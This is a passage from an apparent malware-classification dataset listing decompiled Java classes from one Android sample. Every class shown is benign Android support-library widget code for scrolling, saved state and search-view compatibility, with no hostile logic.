int dropDownLayout){     this.mDropDownLayout=dropDownLayout;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel source){       return new SavedState(source);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   int lockModeLeft;   int lockModeRight;   int openDrawerGravity;   public SavedState(  Parcel in){     super(in);     this.openDrawerGravity=0;     this.lockModeLeft=0;     this.lockModeRight=0;     this.openDrawerGravity=in.readInt();   }   public SavedState(  Parcelable superState){     super(superState);     this.openDrawerGravity=0;     this.lockModeLeft=0;     this.lockModeRight=0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     super.writeToParcel(dest,flags);     dest.writeInt(this.openDrawerGravity);   } } public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   boolean isOpen;   SavedState(  Parcelable superState){     super(superState);   }   private SavedState(  Parcel in){     super(in);     this.isOpen=in.readInt() != 0;   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeInt(this.isOpen ? 1 : 0);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ScrollAnimationRunnable.code","public class ScrollAnimationRunnable implements Runnable {   private ScrollAnimationRunnable(){   }   @Override public void run(){     if (AutoScrollHelper.this.mAnimating) {       if (AutoScrollHelper.this.mNeedsReset) {         AutoScrollHelper.this.mNeedsReset=false;         AutoScrollHelper.this.mScroller.start();       }       ClampedScroller scroller=AutoScrollHelper.this.mScroller;       if (scroller.isFinished() || !AutoScrollHelper.this.shouldAnimate()) {         AutoScrollHelper.this.mAnimating=false;         return;       }       if (AutoScrollHelper.this.mNeedsCancel) {         AutoScrollHelper.this.mNeedsCancel=false;         AutoScrollHelper.this.cancelTargetTouch();       }       scroller.computeScrollDelta();       int deltaX=scroller.getDeltaX();       int deltaY=scroller.getDeltaY();       AutoScrollHelper.this.scrollTargetBy(deltaX,deltaY);       ViewCompat.postOnAnimation(AutoScrollHelper.this.mTarget,this);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ScrollerCompat.code","public class ScrollerCompat {   static final ScrollerCompatImpl IMPL;   Object mScroller; interface ScrollerCompatImpl {     void abortAnimation(    Object obj);     boolean computeScrollOffset(    Object obj);     Object createScroller(    Context context,    Interpolator interpolator);     void fling(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5,    int i6,    int i7,    int i8);     void fling(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5,    int i6,    int i7,    int i8,    int i9,    int i10);     float getCurrVelocity(    Object obj);     int getCurrX(    Object obj);     int getCurrY(    Object obj);     int getFinalX(    Object obj);     int getFinalY(    Object obj);     boolean isFinished(    Object obj);     boolean isOverScrolled(    Object obj);     void notifyHorizontalEdgeReached(    Object obj,    int i,    int i2,    int i3);     void notifyVerticalEdgeReached(    Object obj,    int i,    int i2,    int i3);     void startScroll(    Object obj,    int i,    int i2,    int i3,    int i4);     void startScroll(    Object obj,    int i,    int i2,    int i3,    int i4,    int i5);   } static class ScrollerCompatImplBase implements ScrollerCompatImpl {     ScrollerCompatImplBase(){     }     @Override public Object createScroller(    Context context,    Interpolator interpolator){       return interpolator != null ? new Scroller(context,interpolator) : new Scroller(context);     }     @Override public boolean isFinished(    Object scroller){       return ((Scroller)scroller).isFinished();     }     @Override public int getCurrX(    Object scroller){       return ((Scroller)scroller).getCurrX();     }     @Override public int getCurrY(    Object scroller){       return ((Scroller)scroller).getCurrY();     }     @Override public float getCurrVelocity(    Object scroller){       return 0.0f;     }     @Override public boolean computeScrollOffset(    Object scroller){       return ((Scroller)scroller).computeScrollOffset();     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy){       ((Scroller)scroller).startScroll(startX,startY,dx,dy);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy,    int duration){       ((Scroller)scroller).startScroll(startX,startY,dx,dy,duration);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY){       ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY,    int overX,    int overY){       ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void abortAnimation(    Object scroller){       ((Scroller)scroller).abortAnimation();     }     @Override public void notifyHorizontalEdgeReached(    Object scroller,    int startX,    int finalX,    int overX){     }     @Override public void notifyVerticalEdgeReached(    Object scroller,    int startY,    int finalY,    int overY){     }     @Override public boolean isOverScrolled(    Object scroller){       return false;     }     @Override public int getFinalX(    Object scroller){       return ((Scroller)scroller).getFinalX();     }     @Override public int getFinalY(    Object scroller){       return ((Scroller)scroller).getFinalY();     }   } static class ScrollerCompatImplGingerbread implements ScrollerCompatImpl {     ScrollerCompatImplGingerbread(){     }     @Override public Object createScroller(    Context context,    Interpolator interpolator){       return ScrollerCompatGingerbread.createScroller(context,interpolator);     }     @Override public boolean isFinished(    Object scroller){       return ScrollerCompatGingerbread.isFinished(scroller);     }     @Override public int getCurrX(    Object scroller){       return ScrollerCompatGingerbread.getCurrX(scroller);     }     @Override public int getCurrY(    Object scroller){       return ScrollerCompatGingerbread.getCurrY(scroller);     }     @Override public float getCurrVelocity(    Object scroller){       return 0.0f;     }     @Override public boolean computeScrollOffset(    Object scroller){       return ScrollerCompatGingerbread.computeScrollOffset(scroller);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy){       ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy);     }     @Override public void startScroll(    Object scroller,    int startX,    int startY,    int dx,    int dy,    int duration){       ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy,duration);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY){       ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY);     }     @Override public void fling(    Object scroller,    int startX,    int startY,    int velX,    int velY,    int minX,    int maxX,    int minY,    int maxY,    int overX,    int overY){       ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);     }     @Override public void abortAnimation(    Object scroller){       ScrollerCompatGingerbread.abortAnimation(scroller);     }     @Override public void notifyHorizontalEdgeReached(    Object scroller,    int startX,    int finalX,    int overX){       ScrollerCompatGingerbread.notifyHorizontalEdgeReached(scroller,startX,finalX,overX);     }     @Override public void notifyVerticalEdgeReached(    Object scroller,    int startY,    int finalY,    int overY){       ScrollerCompatGingerbread.notifyVerticalEdgeReached(scroller,startY,finalY,overY);     }     @Override public boolean isOverScrolled(    Object scroller){       return ScrollerCompatGingerbread.isOverScrolled(scroller);     }     @Override public int getFinalX(    Object scroller){       return ScrollerCompatGingerbread.getFinalX(scroller);     }     @Override public int getFinalY(    Object scroller){       return ScrollerCompatGingerbread.getFinalY(scroller);     }   } static class ScrollerCompatImplIcs extends ScrollerCompatImplGingerbread {     ScrollerCompatImplIcs(){     }     @Override public float getCurrVelocity(    Object scroller){       return ScrollerCompatIcs.getCurrVelocity(scroller);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ScrollerCompatImplIcs();     }  else     if (version >= 9) {       IMPL=new ScrollerCompatImplGingerbread();     }  else {       IMPL=new ScrollerCompatImplBase();     }   }   public static ScrollerCompat create(  Context context){     return create(context,null);   }   public static ScrollerCompat create(  Context context,  Interpolator interpolator){     return new ScrollerCompat(context,interpolator);   }   ScrollerCompat(  Context context,  Interpolator interpolator){     this.mScroller=IMPL.createScroller(context,interpolator);   }   public boolean isFinished(){     return IMPL.isFinished(this.mScroller);   }   public int getCurrX(){     return IMPL.getCurrX(this.mScroller);   }   public int getCurrY(){     return IMPL.getCurrY(this.mScroller);   }   public int getFinalX(){     return IMPL.getFinalX(this.mScroller);   }   public int getFinalY(){     return IMPL.getFinalY(this.mScroller);   }   public float getCurrVelocity(){     return IMPL.getCurrVelocity(this.mScroller);   }   public boolean computeScrollOffset(){     return IMPL.computeScrollOffset(this.mScroller);   }   public void startScroll(  int startX,  int startY,  int dx,  int dy){     IMPL.startScroll(this.mScroller,startX,startY,dx,dy);   }   public void startScroll(  int startX,  int startY,  int dx,  int dy,  int duration){     IMPL.startScroll(this.mScroller,startX,startY,dx,dy,duration);   }   public void fling(  int startX,  int startY,  int velocityX,  int velocityY,  int minX,  int maxX,  int minY,  int maxY){     IMPL.fling(this.mScroller,startX,startY,velocityX,velocityY,minX,maxX,minY,maxY);   }   public void fling(  int startX,  int startY,  int velocityX,  int velocityY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     IMPL.fling(this.mScroller,startX,startY,velocityX,velocityY,minX,maxX,minY,maxY,overX,overY);   }   public void abortAnimation(){     IMPL.abortAnimation(this.mScroller);   }   public void notifyHorizontalEdgeReached(  int startX,  int finalX,  int overX){     IMPL.notifyHorizontalEdgeReached(this.mScroller,startX,finalX,overX);   }   public void notifyVerticalEdgeReached(  int startY,  int finalY,  int overY){     IMPL.notifyVerticalEdgeReached(this.mScroller,startY,finalY,overY);   }   public boolean isOverScrolled(){     return IMPL.isOverScrolled(this.mScroller);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ScrollerCompatGingerbread.code","class ScrollerCompatGingerbread {   ScrollerCompatGingerbread(){   }   public static Object createScroller(  Context context,  Interpolator interpolator){     return interpolator != null ? new OverScroller(context,interpolator) : new OverScroller(context);   }   public static boolean isFinished(  Object scroller){     return ((OverScroller)scroller).isFinished();   }   public static int getCurrX(  Object scroller){     return ((OverScroller)scroller).getCurrX();   }   public static int getCurrY(  Object scroller){     return ((OverScroller)scroller).getCurrY();   }   public static boolean computeScrollOffset(  Object scroller){     return ((OverScroller)scroller).computeScrollOffset();   }   public static void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ((OverScroller)scroller).startScroll(startX,startY,dx,dy);   }   public static void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ((OverScroller)scroller).startScroll(startX,startY,dx,dy,duration);   }   public static void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ((OverScroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   public static void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ((OverScroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);   }   public static void abortAnimation(  Object scroller){     ((OverScroller)scroller).abortAnimation();   }   public static void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){     ((OverScroller)scroller).notifyHorizontalEdgeReached(startX,finalX,overX);   }   public static void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){     ((OverScroller)scroller).notifyVerticalEdgeReached(startY,finalY,overY);   }   public static boolean isOverScrolled(  Object scroller){     return ((OverScroller)scroller).isOverScrolled();   }   public static int getFinalX(  Object scroller){     return ((OverScroller)scroller).getFinalX();   }   public static int getFinalY(  Object scroller){     return ((OverScroller)scroller).getFinalY();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ScrollerCompatIcs.code","class ScrollerCompatIcs {   ScrollerCompatIcs(){   }   public static float getCurrVelocity(  Object scroller){     return ((OverScroller)scroller).getCurrVelocity();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ScrollerCompatImpl.code","interface ScrollerCompatImpl {   void abortAnimation(  Object obj);   boolean computeScrollOffset(  Object obj);   Object createScroller(  Context context,  Interpolator interpolator);   void fling(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8);   void fling(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8,  int i9,  int i10);   float getCurrVelocity(  Object obj);   int getCurrX(  Object obj);   int getCurrY(  Object obj);   int getFinalX(  Object obj);   int getFinalY(  Object obj);   boolean isFinished(  Object obj);   boolean isOverScrolled(  Object obj);   void notifyHorizontalEdgeReached(  Object obj,  int i,  int i2,  int i3);   void notifyVerticalEdgeReached(  Object obj,  int i,  int i2,  int i3);   void startScroll(  Object obj,  int i,  int i2,  int i3,  int i4);   void startScroll(  Object obj,  int i,  int i2,  int i3,  int i4,  int i5); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ScrollerCompatImplBase.code","static class ScrollerCompatImplBase implements ScrollerCompatImpl {   ScrollerCompatImplBase(){   }   @Override public Object createScroller(  Context context,  Interpolator interpolator){     return interpolator != null ? new Scroller(context,interpolator) : new Scroller(context);   }   @Override public boolean isFinished(  Object scroller){     return ((Scroller)scroller).isFinished();   }   @Override public int getCurrX(  Object scroller){     return ((Scroller)scroller).getCurrX();   }   @Override public int getCurrY(  Object scroller){     return ((Scroller)scroller).getCurrY();   }   @Override public float getCurrVelocity(  Object scroller){     return 0.0f;   }   @Override public boolean computeScrollOffset(  Object scroller){     return ((Scroller)scroller).computeScrollOffset();   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ((Scroller)scroller).startScroll(startX,startY,dx,dy);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ((Scroller)scroller).startScroll(startX,startY,dx,dy,duration);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ((Scroller)scroller).fling(startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void abortAnimation(  Object scroller){     ((Scroller)scroller).abortAnimation();   }   @Override public void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){   }   @Override public void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){   }   @Override public boolean isOverScrolled(  Object scroller){     return false;   }   @Override public int getFinalX(  Object scroller){     return ((Scroller)scroller).getFinalX();   }   @Override public int getFinalY(  Object scroller){     return ((Scroller)scroller).getFinalY();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ScrollerCompatImplGingerbread.code","static class ScrollerCompatImplGingerbread implements ScrollerCompatImpl {   ScrollerCompatImplGingerbread(){   }   @Override public Object createScroller(  Context context,  Interpolator interpolator){     return ScrollerCompatGingerbread.createScroller(context,interpolator);   }   @Override public boolean isFinished(  Object scroller){     return ScrollerCompatGingerbread.isFinished(scroller);   }   @Override public int getCurrX(  Object scroller){     return ScrollerCompatGingerbread.getCurrX(scroller);   }   @Override public int getCurrY(  Object scroller){     return ScrollerCompatGingerbread.getCurrY(scroller);   }   @Override public float getCurrVelocity(  Object scroller){     return 0.0f;   }   @Override public boolean computeScrollOffset(  Object scroller){     return ScrollerCompatGingerbread.computeScrollOffset(scroller);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy){     ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy);   }   @Override public void startScroll(  Object scroller,  int startX,  int startY,  int dx,  int dy,  int duration){     ScrollerCompatGingerbread.startScroll(scroller,startX,startY,dx,dy,duration);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY){     ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY);   }   @Override public void fling(  Object scroller,  int startX,  int startY,  int velX,  int velY,  int minX,  int maxX,  int minY,  int maxY,  int overX,  int overY){     ScrollerCompatGingerbread.fling(scroller,startX,startY,velX,velY,minX,maxX,minY,maxY,overX,overY);   }   @Override public void abortAnimation(  Object scroller){     ScrollerCompatGingerbread.abortAnimation(scroller);   }   @Override public void notifyHorizontalEdgeReached(  Object scroller,  int startX,  int finalX,  int overX){     ScrollerCompatGingerbread.notifyHorizontalEdgeReached(scroller,startX,finalX,overX);   }   @Override public void notifyVerticalEdgeReached(  Object scroller,  int startY,  int finalY,  int overY){     ScrollerCompatGingerbread.notifyVerticalEdgeReached(scroller,startY,finalY,overY);   }   @Override public boolean isOverScrolled(  Object scroller){     return ScrollerCompatGingerbread.isOverScrolled(scroller);   }   @Override public int getFinalX(  Object scroller){     return ScrollerCompatGingerbread.getFinalX(scroller);   }   @Override public int getFinalY(  Object scroller){     return ScrollerCompatGingerbread.getFinalY(scroller);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ScrollerCompatImplIcs.code","static class ScrollerCompatImplIcs extends ScrollerCompatImplGingerbread {   ScrollerCompatImplIcs(){   }   @Override public float getCurrVelocity(  Object scroller){     return ScrollerCompatIcs.getCurrVelocity(scroller);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SearchViewCompat.code","public class SearchViewCompat {   private static final SearchViewCompatImpl IMPL; interface SearchViewCompatImpl {     CharSequence getQuery(    View view);     boolean isIconified(    View view);     boolean isQueryRefinementEnabled(    View view);     boolean isSubmitButtonEnabled(    View view);     Object newOnCloseListener(    OnCloseListenerCompat onCloseListenerCompat);     Object newOnQueryTextListener(    OnQueryTextListenerCompat onQueryTextListenerCompat);     View newSearchView(    Context context);     void setIconified(    View view,    boolean z);     void setImeOptions(    View view,    int i);     void setInputType(    View view,    int i);     void setMaxWidth(    View view,    int i);     void setOnCloseListener(    Object obj,    Object obj2);     void setOnQueryTextListener(    Object obj,    Object obj2);     void setQuery(    View view,    CharSequence charSequence,    boolean z);     void setQueryHint(    View view,    CharSequence charSequence);     void setQueryRefinementEnabled(    View view,    boolean z);     void setSearchableInfo(    View view,    ComponentName componentName);     void setSubmitButtonEnabled(    View view,    boolean z);   } static class SearchViewCompatStubImpl implements SearchViewCompatImpl {     SearchViewCompatStubImpl(){     }     @Override public View newSearchView(    Context context){       return null;     }     @Override public void setSearchableInfo(    View searchView,    ComponentName searchableComponent){     }     @Override public void setImeOptions(    View searchView,    int imeOptions){     }     @Override public void setInputType(    View searchView,    int inputType){     }     @Override public Object newOnQueryTextListener(    OnQueryTextListenerCompat listener){       return null;     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){     }     @Override public Object newOnCloseListener(    OnCloseListenerCompat listener){       return null;     }     @Override public void setOnCloseListener(    Object searchView,    Object listener){     }     @Override public CharSequence getQuery(    View searchView){       return null;     }     @Override public void setQuery(    View searchView,    CharSequence query,    boolean submit){     }     @Override public void setQueryHint(    View searchView,    CharSequence hint){     }     @Override public void setIconified(    View searchView,    boolean iconify){     }     @Override public boolean isIconified(    View searchView){       return true;     }     @Override public void setSubmitButtonEnabled(    View searchView,    boolean enabled){     }     @Override public boolean isSubmitButtonEnabled(    View searchView){       return false;     }     @Override public void setQueryRefinementEnabled(    View searchView,    boolean enable){     }     @Override public boolean isQueryRefinementEnabled(    View searchView){       return false;     }     @Override public void setMaxWidth(    View searchView,    int maxpixels){     }   } static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {     SearchViewCompatHoneycombImpl(){     }     @Override public View newSearchView(    Context context){       return SearchViewCompatHoneycomb.newSearchView(context);     }     @Override public void setSearchableInfo(    View searchView,    ComponentName searchableComponent){       SearchViewCompatHoneycomb.setSearchableInfo(searchView,searchableComponent);     }     @Override public Object newOnQueryTextListener(    final OnQueryTextListenerCompat listener){       return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){         @Override public boolean onQueryTextSubmit(        String query){           return listener.onQueryTextSubmit(query);         }         @Override public boolean onQueryTextChange(        String newText){           return listener.onQueryTextChange(newText);         }       } );     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){       SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);     }     @Override public Object newOnCloseListener(    final OnCloseListenerCompat listener){       return SearchViewCompatHoneycomb.newOnCloseListener(new SearchViewCompatHoneycomb.OnCloseListenerCompatBridge(){         @Override public boolean onClose(){           return listener.onClose();         }       } );     }     @Override public void setOnCloseListener(    Object searchView,    Object listener){       SearchViewCompatHoneycomb.setOnCloseListener(searchView,listener);     }     @Override public CharSequence getQuery(    View searchView){       return SearchViewCompatHoneycomb.getQuery(searchView);     }     @Override public void setQuery(    View searchView,    CharSequence query,    boolean submit){       SearchViewCompatHoneycomb.setQuery(searchView,query,submit);     }     @Override public void setQueryHint(    View searchView,    CharSequence hint){       SearchViewCompatHoneycomb.setQueryHint(searchView,hint);     }     @Override public void setIconified(    View searchView,    boolean iconify){       SearchViewCompatHoneycomb.setIconified(searchView,iconify);     }     @Override public boolean isIconified(    View searchView){       return SearchViewCompatHoneycomb.isIconified(searchView);     }     @Override public void setSubmitButtonEnabled(    View searchView,    boolean enabled){       SearchViewCompatHoneycomb.setSubmitButtonEnabled(searchView,enabled);     }     @Override public boolean isSubmitButtonEnabled(    View searchView){       return SearchViewCompatHoneycomb.isSubmitButtonEnabled(searchView);     }     @Override public void setQueryRefinementEnabled(    View searchView,    boolean enable){       SearchViewCompatHoneycomb.setQueryRefinementEnabled(searchView,enable);     }     @Override public boolean isQueryRefinementEnabled(    View searchView){       return SearchViewCompatHoneycomb.isQueryRefinementEnabled(searchView);     }     @Override public void setMaxWidth(    View searchView,    int maxpixels){       SearchViewCompatHoneycomb.setMaxWidth(searchView,maxpixels);     }   } static class SearchViewCompatIcsImpl extends SearchViewCompatHoneycombImpl {     SearchViewCompatIcsImpl(){     }     @Override public View newSearchView(    Context context){       return SearchViewCompatIcs.newSearchView(context);     }     @Override public void setImeOptions(    View searchView,    int imeOptions){       SearchViewCompatIcs.setImeOptions(searchView,imeOptions);     }     @Override public void setInputType(    View searchView,    int inputType){       SearchViewCompatIcs.setInputType(searchView,inputType);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new SearchViewCompatIcsImpl();     }  else     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new SearchViewCompatHoneycombImpl();     }  else {       IMPL=new SearchViewCompatStubImpl();     }   }   private SearchViewCompat(  Context context){   }   public static View newSearchView(  Context context){     return IMPL.newSearchView(context);   }   public static void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     IMPL.setSearchableInfo(searchView,searchableComponent);   }   public static void setImeOptions(  View searchView,  int imeOptions){     IMPL.setImeOptions(searchView,imeOptions);   }   public static void setInputType(  View searchView,  int inputType){     IMPL.setInputType(searchView,inputType);   }   public static void setOnQueryTextListener(  View searchView,  OnQueryTextListenerCompat listener){     IMPL.setOnQueryTextListener(searchView,listener.mListener);   } public static abstract class OnQueryTextListenerCompat {     final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);     public boolean onQueryTextSubmit(    String query){       return false;     }     public boolean onQueryTextChange(    String newText){       return false;     }   }   public static void setOnCloseListener(  View searchView,  OnCloseListenerCompat listener){     IMPL.setOnCloseListener(searchView,listener.mListener);   } public static abstract class OnCloseListenerCompat {     final Object mListener=SearchViewCompat.IMPL.newOnCloseListener(this);     public boolean onClose(){       return false;     }   }   public static CharSequence getQuery(  View searchView){     return IMPL.getQuery(searchView);   }   public static void setQuery(  View searchView,  CharSequence query,  boolean submit){     IMPL.setQuery(searchView,query,submit);   }   public static void setQueryHint(  View searchView,  CharSequence hint){     IMPL.setQueryHint(searchView,hint);   }   public static void setIconified(  View searchView,  boolean iconify){     IMPL.setIconified(searchView,iconify);   }   public static boolean isIconified(  View searchView){     return IMPL.isIconified(searchView);   }   public static void setSubmitButtonEnabled(  View searchView,  boolean enabled){     IMPL.setSubmitButtonEnabled(searchView,enabled);   }   public static boolean isSubmitButtonEnabled(  View searchView){     return IMPL.isSubmitButtonEnabled(searchView);   }   public static void setQueryRefinementEnabled(  View searchView,  boolean enable){     IMPL.setQueryRefinementEnabled(searchView,enable);   }   public static boolean isQueryRefinementEnabled(  View searchView){     return IMPL.isQueryRefinementEnabled(searchView);   }   public static void setMaxWidth(  View searchView,  int maxpixels){     IMPL.setMaxWidth(searchView,maxpixels);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SearchViewCompatHoneycomb.code","class SearchViewCompatHoneycomb { interface OnCloseListenerCompatBridge {     boolean onClose();   } interface OnQueryTextListenerCompatBridge {     boolean onQueryTextChange(    String str);     boolean onQueryTextSubmit(    String str);   }   SearchViewCompatHoneycomb(){   }   public static View newSearchView(  Context context){     return new SearchView(context);   }   public static void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     SearchView sv=(SearchView)searchView;     SearchManager searchManager=(SearchManager)sv.getContext().getSystemService(""search"");     sv.setSearchableInfo(searchManager.getSearchableInfo(searchableComponent));   }   public static Object newOnQueryTextListener(  final OnQueryTextListenerCompatBridge listener){     return new SearchView.OnQueryTextListener(){       @Override public boolean onQueryTextSubmit(      String query){         return OnQueryTextListenerCompatBridge.this.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return OnQueryTextListenerCompatBridge.this.onQueryTextChange(newText);       }     } ;   }   public static void setOnQueryTextListener(  Object searchView,  Object listener){     ((SearchView)searchView).setOnQueryTextListener((SearchView.OnQueryTextListener)listener);   }   public static Object newOnCloseListener(  final OnCloseListenerCompatBridge listener){     return new SearchView.OnCloseListener(){       @Override public boolean onClose(){         return OnCloseListenerCompatBridge.this.onClose();       }     } ;   }   public static void setOnCloseListener(  Object searchView,  Object listener){     ((SearchView)searchView).setOnCloseListener((SearchView.OnCloseListener)listener);   }   public static CharSequence getQuery(  View searchView){     return ((SearchView)searchView).getQuery();   }   public static void setQuery(  View searchView,  CharSequence query,  boolean submit){     ((SearchView)searchView).setQuery(query,submit);   }   public static void setQueryHint(  View searchView,  CharSequence hint){     ((SearchView)searchView).setQueryHint(hint);   }   public static void setIconified(  View searchView,  boolean iconify){     ((SearchView)searchView).setIconified(iconify);   }   public static boolean isIconified(  View searchView){     return ((SearchView)searchView).isIconified();   }   public static void setSubmitButtonEnabled(  View searchView,  boolean enabled){     ((SearchView)searchView).setSubmitButtonEnabled(enabled);   }   public static boolean isSubmitButtonEnabled(  View searchView){     return ((SearchView)searchView).isSubmitButtonEnabled();   }   public static void setQueryRefinementEnabled(  View searchView,  boolean enable){     ((SearchView)searchView).setQueryRefinementEnabled(enable);   }   public static boolean isQueryRefinementEnabled(  View searchView){     return ((SearchView)searchView).isQueryRefinementEnabled();   }   public static void setMaxWidth(  View searchView,  int maxpixels){     ((SearchView)searchView).setMaxWidth(maxpixels);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\SearchViewCompatHoneycombImpl.code","static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {   SearchViewCompatHoneycombImpl(){   }   @Override public View newSearchView(  Context context){     return SearchViewCompatHoneycomb.newSearchView(context);   }   @Override public void setSearchableInfo(  View searchView,  ComponentName searchableComponent){     SearchViewCompatHoneycomb.setSearchableInfo(searchView,searchableComponent);   }   @Override public Object newOnQueryTextListener(  final OnQueryTextListenerCompat listener){     return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){       @Override public boolean onQueryTextSubmit(      String query){         return listener.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return listener.onQueryTextChange(newText);       }     } );   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){     SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);   }   @Override public Object newOnCloseListener(  final OnCloseListenerCompat listener){     return SearchViewCompatHoneycomb.newOnCloseListener(new SearchViewCompatHoneycomb.OnCloseListenerCompatBridge(){       @Override public boolean onClose(){         return listener.onClose();       }     } );   }   @Override public void setOnCloseListener(  Object searchView,  Object listener){     SearchViewCompatHoneycomb.setOnCloseListener(searchView,listener);   }   @Override public CharSequence getQuery(  View searchView){     return SearchViewCompatHoneycomb.getQuery(searchView);   }   @Override public void setQuery(  View searchView,  CharSequence query,  boolean submit){     SearchViewCompatHoneycomb.setQuery(searchView,query,submit);   }   @Override public void setQueryHint(  View searchView,  CharSequence hint){     SearchViewCompatHoneycomb.setQueryHint(searchView,hint);   }   @Override public void setIconified(  View searchView,  boolean iconify){     SearchViewCompatHoneycomb.setIconified(searchView,iconify);   }   @Override public boolean isIconified(  View 